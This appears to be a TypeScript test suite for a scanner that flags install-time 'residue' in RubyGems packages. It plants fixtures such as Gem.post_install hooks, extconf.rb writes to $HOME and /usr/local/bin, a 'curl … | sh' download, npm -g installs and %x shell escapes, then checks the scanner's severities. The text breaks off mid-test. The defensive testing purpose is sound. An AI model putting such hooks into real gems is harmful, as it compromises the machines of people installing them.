// R3b (plan border-residue-gate): rubygems leg — extconf.rb write-confinement, rubygems_plugin.rb
// auto-load CRITICAL lane, Gem hook tokens, cross-manager reachability, T4 artifact-wide sweep over
// .gem data, and the unmatchable-extension MEDIUM note (plan AC: "never silent clean"). Fixtures are
// SOURCE dirs under test/fixtures/residue/ built at test time by the REAL `gem build` (gem 3.6.7,
// same provenance doctrine as the pypi suite's real `python3 -m build`); the .gem bytes are never
// committed. The unmatch container alone must be hand-assembled: gem build REFUSES a spec whose
// extensions entry is not a file ("[\"ext/ghost/extconf.rb\"] are not files", probe 2026-09-09), so
// the mismatch shape reaches the gate only through third-party tooling / repack — behind a scripted
// fake-gem seam exactly like the crates suite's fake cargo (no gem resolution, no network, no build
// execution of any planted file — every fixture is pattern-matched as text).
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cpSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { after, test } from "node:test";

import { runRubygemsArtifactStage } from "../src/artifacts/rubygems.ts";
import { gemDeclaredExtensions } from "../src/artifacts/residueGem.ts";
import type { BorderConfig } from "../src/config.ts";
import { computeVerdict, type Finding } from "../src/findings.ts";
import { makeFixtureDir, removeDir, writeRel } from "./helpers/fixtures.ts";

const CORPUS = new URL("./fixtures/residue/", import.meta.url).pathname;

const cfg: BorderConfig = {
  version: 1,
  targets: { git: { remotes: [] }, rubygems: {} },
  rules: { authors: { emails: [], names: [] }, hosts: [], ips: [], pathPatterns: [], maxFileKB: 500 },
  allow: [],
  engines: { require: ["gitleaks", "secretlint"], trufflehog: false },
};

const roots: string[] = [];
after(() => {
  for (const d of roots) removeDir(d);
});

const GOLDEN_EXTCONF = readFileSync(join(CORPUS, "n-gem-native/ext/ghost/extconf.rb"), "utf8");
const GOLDEN_CLEAN_GEMSPEC = readFileSync(join(CORPUS, "n-gem-clean/acme-clean.gemspec"), "utf8");

/** Stage a real `gem build` of (corpus dir ⊕ file patches) through the rubygems artifact stage. */
async function stageGem(name: string, dir: string, patches: Record<string, string> = {}): Promise<readonly Finding[]> {
  const repo = makeFixtureDir(`residue-${name}`);
  roots.push(repo);
  cpSync(join(CORPUS, dir), repo, { recursive: true });
  for (const [rel, text] of Object.entries(patches)) writeRel(repo, rel, text);
  const { findings } = await runRubygemsArtifactStage({
    repoDir: repo,
    cfg,
    skipGitleaks: true,
    skipSecretlint: true,
  });
  return findings;
}

/** Assemble the unmatchable .gem BY HAND (tar/gzip over the n-gem-unmatch source parts) and stage it
 *  behind a fake-gem seam: `--version` echoes, `build <gemspec> -o <dist>` copies the payload. */
async function stageUnmatchGem(name: string, metadataFile: string, metadataText?: string): Promise<readonly Finding[]> {
  const repo = makeFixtureDir(`residue-${name}`);
  roots.push(repo);
  const src = join(CORPUS, "n-gem-unmatch");
  writeRel(repo, "acme-ghost.gemspec", readFileSync(join(src, "acme-ghost.gemspec"), "utf8"));

  const stage = makeFixtureDir(`${name}-pay`);
  roots.push(stage);
  const metaGz = join(stage, "metadata.gz");
  let metaPath = join(src, metadataFile);
  if (metadataText !== undefined) {
    metaPath = join(stage, "metadata-arg.yaml");
    writeFileSync(metaPath, metadataText);
  }
  writeFileSync(metaGz, spawnSync("gzip", ["-c", metaPath], { encoding: "buffer" }).stdout);
  const dataGz = join(stage, "data.tar.gz");
  const t1 = spawnSync("tar", ["-czf", dataGz, "-C", join(src, "data"), "lib", "ext"], { encoding: "utf8" });
  assert.equal(t1.status, 0, `tar data fixture failed: ${t1.stderr}`);
  const payload = join(repo, "payload.gem");
  const t2 = spawnSync("tar", ["-cf", payload, "-C", stage, "metadata.gz", "data.tar.gz"], { encoding: "utf8" });
  assert.equal(t2.status, 0, `tar gem fixture failed: ${t2.stderr}`);

  const fakeGem = join(repo, "fake-gem.sh");
  writeRel(repo, "fake-gem.sh", `#!/bin/sh\nif [ "$1" = "--version" ]; then echo "3.6.7-residue-seam"; exit 0; fi\ncp "${payload}" "$4"\n`);
  spawnSync("chmod", ["+x", fakeGem]);

  const { findings } = await runRubygemsArtifactStage({
    repoDir: repo,
    cfg,
    gemBinPath: fakeGem,
    skipGitleaks: true,
    skipSecretlint: true,
  });
  return findings;
}

const residue = (fs: readonly Finding[]): Finding[] => fs.filter((f) => f.rule.startsWith("residue-"));
const byRule = (fs: readonly Finding[], rule: string): Finding[] => fs.filter((f) => f.rule === rule);

test("R3b-PIN: golden pure-ruby gem (console script, no extensions, no plugin) emits ZERO residue rows", async () => {
  const findings = await stageGem("g-pin", "n-gem-clean");
  assert.deepEqual(residue(findings), [], `T0 golden must stay silent, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
  assert.equal(computeVerdict(findings), "PASS");
});

test("R3b-PIN2: confined mkmf extconf (dir_config/have_*/in-tree File.write/create_makefile) emits ZERO rows", async () => {
  const findings = await stageGem("g-pin2", "n-gem-native");
  assert.deepEqual(residue(findings), [], `legitimate extconf shape must not row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}:${f.message}`))}`);
  assert.equal(computeVerdict(findings), "PASS");
});

test("R3b-B (rubygems_plugin.rb auto-load anywhere ⇒ exactly one persistence CRITICAL, the gem-world lifecycle-hook analog)", async () => {
  const findings = await stageGem("g-plugin", "n-gem-plugin");
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 1, `plugin file + its post_install token must collapse to ONE row, got ${JSON.stringify(t4.map((f) => f.message))}`);
  assert.equal(t4[0]?.severity, "CRITICAL");
  assert.equal(t4[0]?.path, "data.tar.gz!lib/rubygems_plugin.rb");
  assert.match(t4[0]?.message ?? "", /auto-loaded by EVERY later gem\/ruby process/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-B2 (Gem.post_install token in an ordinary lib file ⇒ persistence CRITICAL even at rest)", async () => {
  const findings = await stageGem("g-token", "n-gem-clean", {
    "lib/quiet.rb": 'Gem.post_install { |installer| warn "hooked" }\n',
    "acme-clean.gemspec": GOLDEN_CLEAN_GEMSPEC.replace('"lib/acme.rb"]', '"lib/acme.rb", "lib/quiet.rb"]'),
  });
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 1, `one hook-token row, got ${JSON.stringify(t4.map((f) => f.message))}`);
  assert.equal(t4[0]?.path, "data.tar.gz!lib/quiet.rb");
  assert.match(t4[0]?.message ?? "", /Gem installer hooks/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C (extconf write to $HOME ⇒ exactly one out-of-tree HIGH)", async () => {
  const findings = await stageGem("g-home", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write("#{$HOME}/.acme-hook", "injection")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `one confinement row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(t3[0]?.path, "data.tar.gz!ext/ghost/extconf.rb");
  assert.match(t3[0]?.message ?? "", /outside the extension build tree/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C2 (extconf write to an absolute /usr/local literal ⇒ out-of-tree HIGH, no family row doubles it)", async () => {
  const findings = await stageGem("g-abs", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write("/usr/local/bin/ghost", "implant")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-D (extconf backtick curl|sh ⇒ exactly one install-download HIGH; the argv URL is not a path write)", async () => {
  const findings = await stageGem("g-dl", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}\`curl -sSL https://build.example.invalid/tool.sh | sh\`\n`,
  });
  const t2 = byRule(findings, "residue-install-download");
  assert.equal(t2.length, 1, `one T2 row, got ${JSON.stringify(t2.map((f) => f.message))}`);
  assert.equal(t2[0]?.severity, "HIGH");
  assert.equal(byRule(findings, "residue-out-of-tree-write").length, 0, "a URL literal must not read as an absolute-path write");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-E (extconf spawns npm -g ⇒ cross-manager HIGH naming the foreign ledger)", async () => {
  const findings = await stageGem("g-xmgr", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system("npm install -g acme-build-tools")\n`,
  });
  const xm = byRule(findings, "residue-cross-manager-write");
  assert.equal(xm.length, 1, `one xmgr row, got ${JSON.stringify(xm.map((f) => f.message))}`);
  assert.match(xm[0]?.message ?? "", /npm -g \(global install\)/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-F (unparseable extconf write argument fails closed: truncated call ⇒ HIGH, never silent)", async () => {
  const findings = await stageGem("g-f", "n-gem-native", {
    "ext/ghost/extconf.rb": 'require "mkmf"\nFile.open(\n',
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, "unbalanced write argument must NOT pass confinement (fail closed)");
  assert.match(t3[0]?.message ?? "", /fail closed/);
});

test("R3b-G (declared extension with no extconf in data ⇒ EXACTLY ONE MEDIUM note, never silent clean)", async () => {
  const findings = await stageUnmatchGem("g-unmatch", "metadata.yaml");
  const un = byRule(findings, "residue-gem-unmatched-extension");
  assert.equal(findings.length, 1, `exactly one row for the whole unmatchable build, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
  assert.equal(un[0]?.severity, "MEDIUM");
  assert.equal(un[0]?.path, "data.tar.gz!ext/ghost/extconf.rb");
  assert.match(un[0]?.message ?? "", /unmatchable/);
  assert.equal(computeVerdict(findings), "PASS", "the note does not block, but silence never happens (plan R3b AC)");
});

test("R3b-G2 (two declarations resolving to one missing extconf ⇒ still ONE note, never extra notes for the same miss)", async () => {
  const findings = await stageUnmatchGem("g-unmatch2", "metadata-dupe.yaml");
  assert.equal(byRule(findings, "residue-gem-unmatched-extension").length, 1);
});

test("R3b-H (persistence primitive in an at-rest lib file ⇒ T4 artifact-wide row regardless of reachability)", async () => {
  const findings = await stageGem("g-t4wide", "n-gem-clean", {
    "lib/acme.rb": 'module Acme\n  CRON = "crontab -l" # PLANTED synthetic string\nend\n',
  });
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 1);
  assert.equal(t4[0]?.severity, "CRITICAL");
  assert.equal(t4[0]?.path, "data.tar.gz!lib/acme.rb");
  assert.equal(computeVerdict(findings), "FAIL");
});

// ------------------------------------------- VERIFIER-REPORT-R3B blocker fixes (BLK-1..4, TDD RED-first)

test("R3b-B3 (BLK-1: double-colon Gem::post_install registers a LIVE hook on box ruby 3.3.8 ⇒ exactly one persistence CRITICAL)", async () => {
  const findings = await stageGem("g-blk1", "n-gem-clean", {
    "lib/quiet.rb": 'Gem::post_install { |i| warn "persisted" }\n',
    "acme-clean.gemspec": GOLDEN_CLEAN_GEMSPEC.replace('"lib/acme.rb"]', '"lib/acme.rb", "lib/quiet.rb"]'),
  });
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 1, `::-form hook must row exactly once, got ${JSON.stringify(t4.map((f) => f.message))}`);
  assert.equal(t4[0]?.severity, "CRITICAL");
  assert.equal(t4[0]?.path, "data.tar.gz!lib/quiet.rb");
  assert.match(t4[0]?.message ?? "", /Gem installer hooks/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C3 (BLK-2: path-variable indirection — o = absolute literal; File.write(o, …) resolves through the binding map ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk2a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}o = "/usr/local/bin/ghost"\nFile.write(o, "data")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bound absolute path must row once, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(t3[0]?.path, "data.tar.gz!ext/ghost/extconf.rb");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C3b (BLK-2: transitive resolution through nested-call bindings ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk2b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}base = "/var/tmp"\nfull = File.join(base, "ghost.so")\nFile.write(full, "x")\n`,
  });
  assert.equal(byRule(findings, "residue-out-of-tree-write").length, 1, "transitive binding must resolve to the rooted literal");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C3c (BLK-2: UNRESOLVABLE bareword operand while a slash-rooted literal exists anywhere in the file ⇒ fail-closed HIGH)", async () => {
  const findings = await stageGem("g-blk2c", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write(some_undefined_path, "data")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, "unresolvable bareword + rooted literal in file must fail closed, never silent");
  assert.match(t3[0]?.message ?? "", /fail closed|unresolvable/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C3d (BLK-2: binding cycle is unresolvable ⇒ fail-closed HIGH while a rooted literal exists in the file)", async () => {
  const findings = await stageGem("g-blk2d", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}a = b + ".h"\nb = a + ".c"\nFile.write(a, "x")\n`,
  });
  assert.equal(byRule(findings, "residue-out-of-tree-write").length, 1, "cycle-guarded resolution must fall to the fail-closed arm");
});

test("R3b-C3e (BLK-2: operand resolving only to relative/in-tree strings stays confined ⇒ ZERO rows)", async () => {
  const findings = await stageGem("g-blk2e", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}hdr = "acme_conf.h"\nFile.write(hdr, "#define X 1\\n")\n`,
  });
  assert.deepEqual(residue(findings), [], `legitimate relative binding must not row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(computeVerdict(findings), "PASS");
});

test("R3b-C4 (BLK-4a: %x|install … /usr/local/bin/| exotic delimiter mirrors the backtick fail-closed row ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk4a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}%x|install -m755 out.so /usr/local/bin/|\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `%x|…| must never silent-pass, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C5 (BLK-4b: File.open(%q{/etc/evil}, 'w') — %q literal text enters the rooted-slash mark test ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk4b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.open(%q{/etc/evil}, "w") { |f| f.write "x" }\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `%q{/etc/evil} must row via literal-text extraction, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C6 (BLK-4c: Dir.chdir anywhere in a reachable extconf is a confinement break ⇒ exactly one HIGH, relative write after it costs no extra row)", async () => {
  const findings = await stageGem("g-blk4c", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Dir.chdir("/tmp")\nFile.write("implant.so", "x")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `chdir rows once (exotic operand cost doctrine), got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /chdir/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-G3 (BLK-3 stage, verifier repro S3: comment line inside the extensions block must NOT terminate collection — declared-but-missing ext ⇒ EXACTLY ONE MEDIUM, never silent clean)", async () => {
  const findings = await stageUnmatchGem(
    "g-blk3",
    "metadata.yaml",
    '--- !ruby/object:Gem::Specification\nname: acme-ghost\nextensions:\n# packaged by tool\n- ext/ghost/extconf.rb\nfiles:\n- lib/acme.rb\n',
  );
  const un = byRule(findings, "residue-gem-unmatched-extension");
  assert.equal(un.length, 1, `comment must not swallow the declaration, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
  assert.equal(un[0]?.severity, "MEDIUM");
  assert.equal(un[0]?.path, "data.tar.gz!ext/ghost/extconf.rb");
});

test("R3b-G4 (BLK-3 unit: gemDeclaredExtensions skips blank+comment lines inside the block, keeps collecting items, stops at the next top-level key)", () => {
  assert.deepEqual(
    gemDeclaredExtensions("extensions:\n\n# packaged by tool\n- ext/ghost/extconf.rb\n  \n# another\n- ext/second/extconf.rb\nfiles:\n- lib/acme.rb\n"),
    ["ext/ghost/extconf.rb", "ext/second/extconf.rb"],
  );
});

test("R3b-G5 (BLK-3 unit: `extensions:` followed by only blanks/comments/EOF is YAML null ⇒ zero declarations legitimately)", () => {
  assert.deepEqual(gemDeclaredExtensions("name: acme\nextensions:\n\n# trailing comment only\n"), []);
  assert.deepEqual(gemDeclaredExtensions("name: acme\nextensions:\n"), []);
});

test("R3b-G6 (BLK-3 unit: unrecognized non-blank non-comment line inside the block ⇒ THROW — gate stops, never silent null)", () => {
  assert.throws(
    () => gemDeclaredExtensions("extensions:\n- ext/ghost/extconf.rb\n  bogus: nested mapping the closed grammar cannot read\nfiles:\n"),
    /unrecognized/u,
  );
});

// ------------------------------------------- VERIFIER-REPORT-R3B-FIX round-2 blocker fixes (BLK-5..8, TDD RED-first)

test("R3b-B4 (BLK-5: `File :: write` — spaced double-colon form, \\s* on BOTH sides — mirrors the dot-form ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk5b4", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File :: write("/usr/local/bin/x", "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `spaced ::-form write must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C7a (BLK-5: Dir::chdir colon-form + later relative write ⇒ exactly one HIGH, the chdir lane is separator-agnostic)", async () => {
  const findings = await stageGem("g-blk5a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Dir::chdir("/tmp")\nFile.write("implant.so", "x")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `::-form chdir must row exactly once, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /chdir/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C7b (BLK-5: FileUtils::cp colon-form with ROOTED destination — a rooted operand in ANY argument position escapes the span)", async () => {
  const findings = await stageGem("g-blk5b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}FileUtils::cp("build/a", "/usr/local/bin/a")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `cp-to-rooted must row (span contains ANY rooted literal), got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C7c (BLK-5: Dir::mkdir colon-form rooted ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk5c", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Dir::mkdir("/usr/local/bin/d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `Dir::mkdir rooted must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C7d (BLK-5: Open3::pipeline_rw colon-form with rooted argv ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk5d", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Open3::pipeline_rw("/usr/local/bin/ghost", "out", "err") { |i| i.puts "x" }\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `Open3::-form rooted argv must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C7e (BLK-5 design pin: IO::popen and Kernel::system ::-forms row BY DESIGN, one row each — not via accidental bare-verb fallback)", async () => {
  const findings = await stageGem("g-blk5e", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}IO::popen("/usr/local/bin/x")\nKernel::system("touch /usr/local/bin/y")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `both ::-forms must row exactly once each, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C4b (BLK-6: %x!…! generic delimiter — box-ruby 3.3.8 executes it live — mirrors the backtick row ⇒ HIGH)", async () => {
  const findings = await stageGem("g-blk6a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}%x!install -m 0777 build/x /usr/local/bin/!\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `%x!…! must never silent-pass, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /install -m 0777/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C4c (BLK-6: %x\"…\" and %x~…~ exotic live delimiters each row ⇒ two HIGH)", async () => {
  const findings = await stageGem("g-blk6b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}%x"touch /usr/local/bin/x"\n%x~install build/y /usr/local/bin/z~\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `%x" and %x~ must both row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-G7 (BLK-7 unit: duplicate top-level `extensions:` keys in EITHER order ⇒ THROW — psych/rubygems is last-wins (box-measured), the closed parser certifies neither)", () => {
  assert.throws(
    () => gemDeclaredExtensions("name: acme\nextensions: []\nextensions:\n- ext/ghost/extconf.rb\nfiles:\n- lib/acme.rb\n"),
    /duplicate extensions/u,
  );
  assert.throws(
    () => gemDeclaredExtensions("name: acme\nextensions:\n- ext/ghost/extconf.rb\nextensions: []\nfiles:\n- lib/acme.rb\n"),
    /duplicate extensions/u,
  );
});

test("R3b-G8 (BLK-7 stage, verifier a5-dupkey: `extensions: []` then block-seq, data lacks the ext ⇒ THROW surfaces as gate stop, never silent clean)", async () => {
  await assert.rejects(
    () =>
      stageUnmatchGem(
        "g-blk7",
        "metadata.yaml",
        "--- !ruby/object:Gem::Specification\nname: acme-ghost\nextensions: []\nextensions:\n- ext/ghost/extconf.rb\nfiles:\n- lib/acme.rb\n",
      ),
    /duplicate extensions/u,
  );
});

test("R3b-C8 (BLK-8: @ivar/$global/CONSTANT bindings resolve through the SAME ALL-bindings map — verifier q-ivar-clean2 class ⇒ three HIGH)", async () => {
  const findings = await stageGem("g-blk8", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}@o = "/usr/local/bin/x"\n$p = "/usr/local/bin/g"\nBIN = "/usr/local/bin/c"\nFile.write(@o, "y")\nFile.write($p, "y")\nFile.write(BIN, "y")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 3, `ivar/global/const bound operands must each resolve and row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
  assert.equal(computeVerdict(findings), "FAIL");
});

// ------------------- VERIFIER-REPORT-R3B-FIX2 round-3 blocker fixes (BLK-R3bF2-A..E, TDD RED-first)

test("R3b-C9a (BLK-R3bF2-A: Dir::home colon-form user-home mark — live on box ruby 3.3.8 ⇒ exactly one HIGH, meta-lesson :: normalized everywhere)", async () => {
  const findings = await stageGem("g-f2a1", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write(Dir::home, "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `Dir::home must row via the OUT_OF_TREE mark lane, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /outside the extension build tree/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C9b (BLK-R3bF2-A: ENV::[] colon-call to the [] method — live on box ruby 3.3.8, ENV['HOME'] analog ⇒ exactly one HIGH)", async () => {
  const findings = await stageGem("g-f2a2", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write(ENV::[]("HOME"), "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `ENV::[] must row via the OUT_OF_TREE mark lane, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /ENV::\[\]/u);
});

test("R3b-C9c (BLK-R3bF2-A: ENV::fetch rows via the gem mark lane ITSELF — the T2 fetch( npm-lane collateral must not be the catcher)", async () => {
  const findings = await stageGem("g-f2a3", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write(ENV::fetch("HOME"), "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `ENV::fetch must row as a T3 mark, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /ENV::fetch/u, `the T3 row must name the ENV:: operand (design-independence from the npm lane)`);
});

test("R3b-C9d (BLK-R3bF2-B: Process.spawn dotted-canonical — the most canonical spawn spelling in Ruby — P20 verbatim ⇒ exactly one HIGH)", async () => {
  const findings = await stageGem("g-f2b1", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Process.spawn("/usr/local/bin/x")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `Process.spawn must row via the explicit Process arm, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C9e (BLK-R3bF2-B: Process::spawn colon-form and Process.spawn dotted-form each pay EXACTLY one row — no double count, no silent pass)", async () => {
  const findings = await stageGem("g-f2b2", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}Process::spawn("/usr/local/bin/a")\nProcess.spawn("/usr/local/bin/b")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `one row per spawn spelling, got ${JSON.stringify(findings.map((f) => f.message))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C10a (BLK-R3bF2-C: %(/usr/local/bin/x) percent-string with immediate rooted content — ROOTED boundary must accept `(` adjacency ⇒ HIGH)", async () => {
  const findings = await stageGem("g-f2c1", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write(%(/usr/local/bin/x), "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `%(...)-adjacent rooted slash must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C10b (BLK-R3bF2-C: %w[/usr/local/bin/x] — box ruby 3.3.8 executes it with that argv (live-verified) — `[` adjacency pays a row ⇒ HIGH)", async () => {
  const findings = await stageGem("g-f2c2", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system(%w[/usr/local/bin/x])\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `%w[ immediate rooted item must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C10c (BLK-R3bF2-C ACCEPTED COST pin: %w[install -m755 build/x /usr/bin/make]-style argv hints in a whitelisted verb row — exotic-operand cost doctrine, named in §8)", async () => {
  const findings = await stageGem("g-f2c3", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system(%w[install -m755 build/x /usr/bin/make])\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `rooted %w item costs one row by design (FP side of the widened boundary), got ${JSON.stringify(findings.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C11a (BLK-R3bF2-D: @@cvar write operand — binding map covers only @ivars/$globals/CONSTANTS/locals, so @@ov is unresolvable ⇒ fail-closed HIGH while a rooted literal exists)", async () => {
  const findings = await stageGem("g-f2d1", "n-gem-native", {
